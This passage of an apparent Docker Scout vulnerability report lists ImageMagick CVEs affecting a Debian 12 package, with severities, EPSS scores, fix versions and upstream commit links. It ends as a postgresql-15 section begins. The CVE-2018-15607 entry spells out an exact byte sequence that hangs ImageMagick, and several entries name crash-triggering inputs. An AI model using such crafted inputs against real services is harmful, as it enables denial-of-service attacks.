<a href="https://scout.docker.com/v/CVE-2025-69204?s=debian&n=imagemagick&ns=debian&t=deb&osn=debian&osv=12&vr=%3C8%3A6.9.11.60%2Bdfsg-1.6%2Bdeb12u5"><img alt="medium : CVE--2025--69204" src="https://img.shields.io/badge/CVE--2025--69204-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code><8:6.9.11.60+dfsg-1.6+deb12u5</code></td></tr>
<tr><td>Fixed version</td><td><code>8:6.9.11.60+dfsg-1.6+deb12u5</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.080%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>24th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

ImageMagick is free and open-source software used for editing and manipulating digital images. Prior to version 7.1.2-12, in the WriteSVGImage function, using an int variable to store number_attributes caused an integer overflow. This, in turn, triggered a buffer overflow and caused a DoS attack. Version 7.1.2-12 fixes the issue.

---
- imagemagick 8:7.1.2.12+dfsg1-1
[trixie] - imagemagick 8:7.1.1.43+dfsg1-1+deb13u4
[bookworm] - imagemagick 8:6.9.11.60+dfsg-1.6+deb12u5
https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-hrh7-j8q2-4qcw
Fixed by: https://github.com/ImageMagick/ImageMagick/commit/2c08c2311693759153c9aa99a6b2dcb5f985681e (7.1.2-12)
Fixed by: https://github.com/ImageMagick/ImageMagick6/commit/c46bc2a29d0712499173c6ffda1d38d7dc8861f5 (6.9.13-37)

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-68618?s=debian&n=imagemagick&ns=debian&t=deb&osn=debian&osv=12&vr=%3C8%3A6.9.11.60%2Bdfsg-1.6%2Bdeb12u5"><img alt="medium : CVE--2025--68618" src="https://img.shields.io/badge/CVE--2025--68618-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code><8:6.9.11.60+dfsg-1.6+deb12u5</code></td></tr>
<tr><td>Fixed version</td><td><code>8:6.9.11.60+dfsg-1.6+deb12u5</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.078%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>24th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

ImageMagick is free and open-source software used for editing and manipulating digital images. Prior to version 7.1.2-12, using Magick to read a malicious SVG file resulted in a DoS attack. Version 7.1.2-12 fixes the issue.

---
- imagemagick 8:7.1.2.12+dfsg1-1
[trixie] - imagemagick 8:7.1.1.43+dfsg1-1+deb13u4
[bookworm] - imagemagick 8:6.9.11.60+dfsg-1.6+deb12u5
https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-p27m-hp98-6637
Fixed by: https://github.com/ImageMagick/ImageMagick/commit/6f431d445f3ddd609c004a1dde617b0a73e60beb (7.1.2-12)
Fixed by: https://github.com/ImageMagick/ImageMagick6/commit/693c8497290ea0c7cac75d3068ea4fa70d7d507e (6.9.13-37)

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-65955?s=debian&n=imagemagick&ns=debian&t=deb&osn=debian&osv=12&vr=%3C8%3A6.9.11.60%2Bdfsg-1.6%2Bdeb12u5"><img alt="medium : CVE--2025--65955" src="https://img.shields.io/badge/CVE--2025--65955-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code><8:6.9.11.60+dfsg-1.6+deb12u5</code></td></tr>
<tr><td>Fixed version</td><td><code>8:6.9.11.60+dfsg-1.6+deb12u5</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.022%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>5th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

ImageMagick is free and open-source software used for editing and manipulating digital images. Prior to 7.1.2-9 and 6.9.13-34, there is a vulnerability in ImageMagick’s Magick++ layer that manifests when Options::fontFamily is invoked with an empty string. Clearing a font family calls RelinquishMagickMemory on _drawInfo->font, freeing the font string but leaving _drawInfo->font pointing to freed memory while _drawInfo->family is set to that (now-invalid) pointer. Any later cleanup or reuse of _drawInfo->font re-frees or dereferences dangling memory. DestroyDrawInfo and other setters (Options::font, Image::font) assume _drawInfo->font remains valid, so destruction or subsequent updates trigger crashes or heap corruption. This vulnerability is fixed in 7.1.2-9 and 6.9.13-34.

---
- imagemagick 8:7.1.2.12+dfsg1-1 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1122827)
[trixie] - imagemagick 8:7.1.1.43+dfsg1-1+deb13u4
[bookworm] - imagemagick 8:6.9.11.60+dfsg-1.6+deb12u5
https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-q3hc-j9x5-mp9m
Introduced with: https://github.com/ImageMagick/ImageMagick/commit/6409f34d637a34a1c643632aa849371ec8b3b5a8 (7.0.1-0)
Introduced with: https://github.com/ImageMagick/ImageMagick6/commit/389ba19fa12920416a02f05abf11e40f3d44b4da (6.9.4-0)
Fixed by: https://github.com/ImageMagick/ImageMagick/commit/6f81eb15f822ad86e8255be75efad6f9762c32f8 (7.1.2-9)
Fixed by: https://github.com/ImageMagick/ImageMagick6/commit/7d4c27fd4cb2a716a9c1d3346a5e79a692cfe6d8 (6.9.13-34)

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-68950?s=debian&n=imagemagick&ns=debian&t=deb&osn=debian&osv=12&vr=%3C8%3A6.9.11.60%2Bdfsg-1.6%2Bdeb12u5"><img alt="medium : CVE--2025--68950" src="https://img.shields.io/badge/CVE--2025--68950-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code><8:6.9.11.60+dfsg-1.6+deb12u5</code></td></tr>
<tr><td>Fixed version</td><td><code>8:6.9.11.60+dfsg-1.6+deb12u5</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.025%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>6th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

ImageMagick is free and open-source software used for editing and manipulating digital images. Prior to version 7.1.2-12, Magick fails to check for circular references between two MVGs, leading to a stack overflow. This is a DoS vulnerability, and any situation that allows reading the mvg file will be affected. Version 7.1.2-12 fixes the issue.

---
- imagemagick 8:7.1.2.12+dfsg1-1
[trixie] - imagemagick 8:7.1.1.43+dfsg1-1+deb13u4
[bookworm] - imagemagick 8:6.9.11.60+dfsg-1.6+deb12u5
https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-7rvh-xqp3-pr8j
Fixed by: https://github.com/ImageMagick/ImageMagick/commit/204718c2211903949dcfc0df8e65ed066b008dec (7.1.2-12)
Fixed by: https://github.com/ImageMagick/ImageMagick6/commit/5655e26ee9032a208ad9add1fde2877205d5e540 (6.9.13-37)

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-57807?s=debian&n=imagemagick&ns=debian&t=deb&osn=debian&osv=12&vr=%3C8%3A6.9.11.60%2Bdfsg-1.6%2Bdeb12u4"><img alt="low : CVE--2025--57807" src="https://img.shields.io/badge/CVE--2025--57807-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code><8:6.9.11.60+dfsg-1.6+deb12u4</code></td></tr>
<tr><td>Fixed version</td><td><code>8:6.9.11.60+dfsg-1.6+deb12u4</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.061%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>19th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

ImageMagick is free and open-source software used for editing and manipulating digital images. ImageMagick versions lower than 14.8.2 include  insecure functions: SeekBlob(), which permits advancing the stream offset beyond the current end without increasing capacity, and WriteBlob(), which then expands by quantum + length (amortized) instead of offset + length, and copies to data + offset. When offset ≫ extent, the copy targets memory beyond the allocation, producing a deterministic heap write on 64-bit builds. No 2⁶⁴ arithmetic wrap, external delegates, or policy settings are required. This is fixed in version 14.8.2.

---
- imagemagick 8:7.1.2.3+dfsg1-1 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1114520)
https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-23hg-53q6-hqfg
https://github.com/ImageMagick/ImageMagick/commit/077a417a19a5ea8c85559b602754a5b928eef23e (7.1.2-3)
https://github.com/ImageMagick/ImageMagick6/commit/ab1bb3d8ed06d0ed6aa5038b6a74aebf53af9ccf (6.9.13-29)

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-55212?s=debian&n=imagemagick&ns=debian&t=deb&osn=debian&osv=12&vr=%3C8%3A6.9.11.60%2Bdfsg-1.6%2Bdeb12u4"><img alt="low : CVE--2025--55212" src="https://img.shields.io/badge/CVE--2025--55212-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code><8:6.9.11.60+dfsg-1.6+deb12u4</code></td></tr>
<tr><td>Fixed version</td><td><code>8:6.9.11.60+dfsg-1.6+deb12u4</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.334%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>56th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

ImageMagick is free and open-source software used for editing and manipulating digital images. Prior to versions 6.9.13-28 and 7.1.2-2, passing a geometry string containing only a colon (":") to montage -geometry leads GetGeometry() to set width/height to 0. Later, ThumbnailImage() divides by these zero dimensions, triggering a crash (SIGFPE/abort), resulting in a denial of service. This issue has been patched in versions 6.9.13-28 and 7.1.2-2.

---
- imagemagick 8:7.1.2.3+dfsg1-1 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1111587)
https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-fh55-q5pj-pxgw
Fixed by [1/2]: https://github.com/ImageMagick/ImageMagick/commit/43d92bf855155e8e716ecbb50ed94c2ed41ff9f6 (7.1.2-2)
Fixed by [2/2]: https://github.com/ImageMagick/ImageMagick/commit/5f0bcf986b8b5e90567750d31a37af502b73f2af (7.1.2-2)
Fixed by [1/2]: https://github.com/ImageMagick/ImageMagick6/commit/5fddcf974342d8e5e02f604bc2297c038e3d4196 (6.9.13-28)
Fixed by [2/2]: https://github.com/ImageMagick/ImageMagick6/commit/3482953ef0af1e538cb776162a8d278141e0b9a0 (6.9.13-28)

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-53019?s=debian&n=imagemagick&ns=debian&t=deb&osn=debian&osv=12&vr=%3C8%3A6.9.11.60%2Bdfsg-1.6%2Bdeb12u4"><img alt="low : CVE--2025--53019" src="https://img.shields.io/badge/CVE--2025--53019-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code><8:6.9.11.60+dfsg-1.6+deb12u4</code></td></tr>
<tr><td>Fixed version</td><td><code>8:6.9.11.60+dfsg-1.6+deb12u4</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.057%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>18th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

ImageMagick is free and open-source software used for editing and manipulating digital images. In versions prior to 7.1.2-0 and 6.9.13-26, in ImageMagick's `magick stream` command, specifying multiple consecutive `%d` format specifiers in a filename template causes a memory leak. Versions 7.1.2-0 and 6.9.13-26 fix the issue.

---
- imagemagick 8:7.1.1.47+dfsg1-2 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1109339)
[trixie] - imagemagick 8:7.1.1.43+dfsg1-1+deb13u1
[bookworm] - imagemagick 8:6.9.11.60+dfsg-1.6+deb12u4
https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-cfh4-9f7v-fhrc
Fixed by: https://github.com/ImageMagick/ImageMagick/commit/fc3ab0812edef903bbb2473c0ee652ddfd04fe5c (7.1.2-0)

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-53014?s=debian&n=imagemagick&ns=debian&t=deb&osn=debian&osv=12&vr=%3C8%3A6.9.11.60%2Bdfsg-1.6%2Bdeb12u4"><img alt="low : CVE--2025--53014" src="https://img.shields.io/badge/CVE--2025--53014-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code><8:6.9.11.60+dfsg-1.6+deb12u4</code></td></tr>
<tr><td>Fixed version</td><td><code>8:6.9.11.60+dfsg-1.6+deb12u4</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.029%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>8th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

ImageMagick is free and open-source software used for editing and manipulating digital images. Versions prior to 7.1.2-0 and 6.9.13-26 have a heap buffer overflow in the `InterpretImageFilename` function. The issue stems from an off-by-one error that causes out-of-bounds memory access when processing format strings containing consecutive percent signs (`%%`). Versions 7.1.2-0 and 6.9.13-26 fix the issue.

---
- imagemagick 8:7.1.1.47+dfsg1-2 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1109339)
[trixie] - imagemagick 8:7.1.1.43+dfsg1-1+deb13u1
[bookworm] - imagemagick 8:6.9.11.60+dfsg-1.6+deb12u4
https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-hm4x-r5hc-794f
Fixed by: https://github.com/ImageMagick/ImageMagick/commit/29d82726c7ec20c07c49ba263bdcea16c2618e03 (7.1.2-0)

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-43965?s=debian&n=imagemagick&ns=debian&t=deb&osn=debian&osv=12&vr=%3C8%3A6.9.11.60%2Bdfsg-1.6%2Bdeb12u3"><img alt="low : CVE--2025--43965" src="https://img.shields.io/badge/CVE--2025--43965-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code><8:6.9.11.60+dfsg-1.6+deb12u3</code></td></tr>
<tr><td>Fixed version</td><td><code>8:6.9.11.60+dfsg-1.6+deb12u3</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.056%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>18th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

In MIFF image processing in ImageMagick before 7.1.1-44, image depth is mishandled after SetQuantumFormat is used.

---
- imagemagick 8:7.1.1.46+dfsg1-1
[trixie] - imagemagick 8:7.1.1.43+dfsg1-1+deb13u1
[bookworm] - imagemagick 8:6.9.11.60+dfsg-1.6+deb12u3
Fixed by: https://github.com/ImageMagick/ImageMagick/commit/bac413a26073923d3ffb258adaab07fb3fe8fdc9 (7.1.1-44)
Fixed by: https://github.com/ImageMagick/ImageMagick6/commit/c99cbc8d8663248bf353cd9042b04d7936e7587a (6.9.13-22)

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-68469?s=debian&n=imagemagick&ns=debian&t=deb&osn=debian&osv=12&vr=%3C8%3A6.9.11.60%2Bdfsg-1.6%2Bdeb12u5"><img alt="low : CVE--2025--68469" src="https://img.shields.io/badge/CVE--2025--68469-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code><8:6.9.11.60+dfsg-1.6+deb12u5</code></td></tr>
<tr><td>Fixed version</td><td><code>8:6.9.11.60+dfsg-1.6+deb12u5</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.022%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>5th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

ImageMagick is free and open-source software used for editing and manipulating digital images. Prior to version 7.1.1-14, ImageMagick crashes when processing a crafted TIFF file. Version 7.1.1-14 fixes the issue.

---
- imagemagick 8:6.9.12.98+dfsg1-2
[bookworm] - imagemagick 8:6.9.11.60+dfsg-1.6+deb12u5
https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-fff3-4rp7-px97
Fixed by: https://github.com/ImageMagick/ImageMagick/commit/a531d28e31309676ce8168c3b6dbbb5374b78790 (7.1.1-13)
Fixed by: https://github.com/ImageMagick/ImageMagick/commit/ac1f7ca1d88e14d30e5ae9bd30aad150bdbec20e (7.1.1-13)
Fixed by: https://github.com/ImageMagick/ImageMagick6/commit/0d00400727170b0540a355a1bc52787bc7bcdea5 (6.9.12-91)
Fixed by: https://github.com/ImageMagick/ImageMagick6/commit/5c0306243f6b5d42951b1312eed4ec4edda9670d (6.9.12-91)

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-55160?s=debian&n=imagemagick&ns=debian&t=deb&osn=debian&osv=12&vr=%3C%3D8%3A6.9.11.60%2Bdfsg-1.6%2Bdeb12u5"><img alt="low : CVE--2025--55160" src="https://img.shields.io/badge/CVE--2025--55160-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code><=8:6.9.11.60+dfsg-1.6+deb12u5</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.038%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>11th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

ImageMagick is free and open-source software used for editing and manipulating digital images. Prior to versions 6.9.13-27 and 7.1.2-1, there is undefined behavior (function-type-mismatch) in splay tree cloning callback. This results in a deterministic abort under UBSan (DoS in sanitizer builds), with no crash in a non-sanitized build. This issue has been patched in versions 6.9.13-27 and 7.1.2-1.

---
- imagemagick 8:7.1.2.1+dfsg1-1 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1111104; unimportant)
https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-6hgw-6x87-578x
https://github.com/ImageMagick/ImageMagick/commit/63d8769dd6a8f32f4096c71be9e08a2c081e47da (7.1.2-1)
https://github.com/ImageMagick/ImageMagick6/commit/986bddf243da88768e8198ee07c758768c098108 (6.9.13-27)
Negligible security impact

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2023-34152?s=debian&n=imagemagick&ns=debian&t=deb&osn=debian&osv=12&vr=%3C%3D8%3A6.9.11.60%2Bdfsg-1.6%2Bdeb12u5"><img alt="low : CVE--2023--34152" src="https://img.shields.io/badge/CVE--2023--34152-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code><=8:6.9.11.60+dfsg-1.6+deb12u5</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>69.305%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>99th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A vulnerability was found in ImageMagick. This security flaw cause a remote code execution vulnerability in OpenBlob with --enable-pipes configured.

---
- imagemagick <unfixed> (unimportant)
https://github.com/ImageMagick/ImageMagick/issues/6339
Only an issue when configured with --enable-pipes. Enabling pipes are
a security risk per se and user needs to take precautions accordingly
when enabled.
https://github.com/ImageMagick/ImageMagick/issues/6339#issuecomment-1559698800
CVE might get rejected or disputed

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2021-20311?s=debian&n=imagemagick&ns=debian&t=deb&osn=debian&osv=12&vr=%3C%3D8%3A6.9.11.60%2Bdfsg-1.6%2Bdeb12u5"><img alt="low : CVE--2021--20311" src="https://img.shields.io/badge/CVE--2021--20311-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code><=8:6.9.11.60+dfsg-1.6+deb12u5</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.125%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>32nd percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A flaw was found in ImageMagick in versions before 7.0.11, where a division by zero in sRGBTransformImage() in the MagickCore/colorspace.c may trigger undefined behavior via a crafted image file that is submitted by an attacker processed by an application using ImageMagick. The highest threat from this vulnerability is to system availability.

---
- imagemagick 8:6.9.12.98+dfsg1-2 (unimportant)
https://github.com/ImageMagick/ImageMagick/commit/70aa86f5d5d8aa605a918ed51f7574f433a18482 (7.0.11-2)
https://github.com/ImageMagick/ImageMagick6/commit/e53e24b078f7fa586f9cc910491b8910f5bdad2e (6.9.12-2)

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2018-15607?s=debian&n=imagemagick&ns=debian&t=deb&osn=debian&osv=12&vr=%3C%3D8%3A6.9.11.60%2Bdfsg-1.6%2Bdeb12u5"><img alt="low : CVE--2018--15607" src="https://img.shields.io/badge/CVE--2018--15607-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code><=8:6.9.11.60+dfsg-1.6+deb12u5</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.908%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>75th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

In ImageMagick 7.0.8-11 Q16, a tiny input file 0x50 0x36 0x36 0x36 0x36 0x4c 0x36 0x38 0x36 0x36 0x36 0x36 0x36 0x36 0x1f 0x35 0x50 0x00 can result in a hang of several minutes during which CPU and memory resources are consumed until ultimately an attempted large memory allocation fails. Remote attackers could leverage this vulnerability to cause a denial of service via a crafted file.

---
- imagemagick <unfixed> (unimportant)
https://github.com/ImageMagick/ImageMagick/issues/1255
This is mitigated by the default policies, if anyone modifies those they need
be tuned to the deployment's memory buildout

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2017-7275?s=debian&n=imagemagick&ns=debian&t=deb&osn=debian&osv=12&vr=%3C%3D8%3A6.9.11.60%2Bdfsg-1.6%2Bdeb12u5"><img alt="low : CVE--2017--7275" src="https://img.shields.io/badge/CVE--2017--7275-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code><=8:6.9.11.60+dfsg-1.6+deb12u5</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.406%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>61st percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

The ReadPCXImage function in coders/pcx.c in ImageMagick 7.0.4.9 allows remote attackers to cause a denial of service (attempted large memory allocation and application crash) via a crafted file. NOTE: this vulnerability exists because of an incomplete fix for CVE-2016-8862 and CVE-2016-8866.

---
- imagemagick <unfixed> (unimportant; bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=859025)
https://blogs.gentoo.org/ago/2017/03/27/imagemagick-memory-allocation-failure-in-acquiremagickmemory-memory-c-incomplete-fix-for-cve-2016-8862-and-cve-2016-8866/
https://github.com/ImageMagick/ImageMagick/issues/271
Furthermore: upstream is not able to reproduce the problem as well
The problem result in a memory allocation issue when compiled with ASAN
but unreproducible from unstream. Since no more details can be provided
and the issue not addressed, treat this as "non-issue" (and thus marked
unimportant). If in future details can be elaborated by the reporter
we might re-evaluate this entry.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2017-11755?s=debian&n=imagemagick&ns=debian&t=deb&osn=debian&osv=12&vr=%3C%3D8%3A6.9.11.60%2Bdfsg-1.6%2Bdeb12u5"><img alt="low : CVE--2017--11755" src="https://img.shields.io/badge/CVE--2017--11755-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code><=8:6.9.11.60+dfsg-1.6+deb12u5</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.528%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>67th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

The WritePICONImage function in coders/xpm.c in ImageMagick 7.0.6-4 allows remote attackers to cause a denial of service (memory leak) via a crafted file that is mishandled in an AcquireSemaphoreInfo call.

---
- imagemagick <unfixed> (unimportant)
https://github.com/ImageMagick/ImageMagick/issues/634
Possibly fixed by same commit as issue #631 upstream

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2017-11754?s=debian&n=imagemagick&ns=debian&t=deb&osn=debian&osv=12&vr=%3C%3D8%3A6.9.11.60%2Bdfsg-1.6%2Bdeb12u5"><img alt="low : CVE--2017--11754" src="https://img.shields.io/badge/CVE--2017--11754-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code><=8:6.9.11.60+dfsg-1.6+deb12u5</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.528%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>67th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

The WritePICONImage function in coders/xpm.c in ImageMagick 7.0.6-4 allows remote attackers to cause a denial of service (memory leak) via a crafted file that is mishandled in an OpenPixelCache call.

---
- imagemagick <unfixed> (unimportant)
https://github.com/ImageMagick/ImageMagick/issues/633
ossibly fixed by same commit as issue #631 upstream

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2016-8678?s=debian&n=imagemagick&ns=debian&t=deb&osn=debian&osv=12&vr=%3C%3D8%3A6.9.11.60%2Bdfsg-1.6%2Bdeb12u5"><img alt="low : CVE--2016--8678" src="https://img.shields.io/badge/CVE--2016--8678-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code><=8:6.9.11.60+dfsg-1.6+deb12u5</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.212%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>44th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

The IsPixelMonochrome function in MagickCore/pixel-accessor.h in ImageMagick 7.0.3.0 allows remote attackers to cause a denial of service (out-of-bounds read and crash) via a crafted file.  NOTE: the vendor says "This is a Q64 issue and we do not support Q64."

---
- imagemagick <unfixed> (unimportant; bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=845204)
https://blogs.gentoo.org/ago/2016/10/07/imagemagick-heap-based-buffer-overflow-in-ispixelmonochrome-pixel-accessor-h/
unimportant: Only an issue with a QuantumDepth=64 build, thus not affecting the binary packages
https://github.com/ImageMagick/ImageMagick/issues/272

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2008-3134?s=debian&n=imagemagick&ns=debian&t=deb&osn=debian&osv=12&vr=%3C%3D8%3A6.9.11.60%2Bdfsg-1.6%2Bdeb12u5"><img alt="low : CVE--2008--3134" src="https://img.shields.io/badge/CVE--2008--3134-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code><=8:6.9.11.60+dfsg-1.6+deb12u5</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>1.621%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>81st percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

Multiple unspecified vulnerabilities in GraphicsMagick before 1.2.4 allow remote attackers to cause a denial of service (crash, infinite loop, or memory consumption) via (a) unspecified vectors in the (1) AVI, (2) AVS, (3) DCM, (4) EPT, (5) FITS, (6) MTV, (7) PALM, (8) RLA, and (9) TGA decoder readers; and (b) the GetImageCharacteristics function in magick/image.c, as reachable from a crafted (10) PNG, (11) JPEG, (12) BMP, or (13) TIFF file.

---
- graphicsmagick 1.2.4-1 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=491439)
- imagemagick <unfixed> (unimportant; bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=559775)
several DoS fixed in 1.2.4 according to upstream
http://sourceforge.net/project/shownotes.php?release_id=610253

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2005-0406?s=debian&n=imagemagick&ns=debian&t=deb&osn=debian&osv=12&vr=%3C%3D8%3A6.9.11.60%2Bdfsg-1.6%2Bdeb12u5"><img alt="low : CVE--2005--0406" src="https://img.shields.io/badge/CVE--2005--0406-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code><=8:6.9.11.60+dfsg-1.6+deb12u5</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.122%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>32nd percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A design flaw in image processing software that modifies JPEG images might not modify the original EXIF thumbnail, which could lead to an information leak of potentially sensitive visual information that had been removed from the main JPEG image.

---
- imagemagick <unfixed> (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=298051; unimportant)
<Maulkin> The EXIF spec says "if your app can't handle $foo, don't touch $foo"
<Piet> 'convert -strip' will remove exif data according to http://web.archive.org/web/20130922031724/http://www.imagemagick.org:80/pipermail/magick-users/2006-May/017538.html

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 6" src="https://img.shields.io/badge/H-6-e25d68"/> <img alt="medium: 4" src="https://img.shields.io/badge/M-4-fbb552"/> <img alt="low: 4" src="https://img.shields.io/badge/L-4-fce1a9"/> <!-- unspecified: 0 --><strong>postgresql-15</strong> <code>15.5-0+deb12u1</code> (deb)</summary>

<small><code>pkg:deb/debian/postgresql-15@15.5-0%2Bdeb12u1?os_distro=bookworm&os_name=debian&os_version=12</code></small><br/>
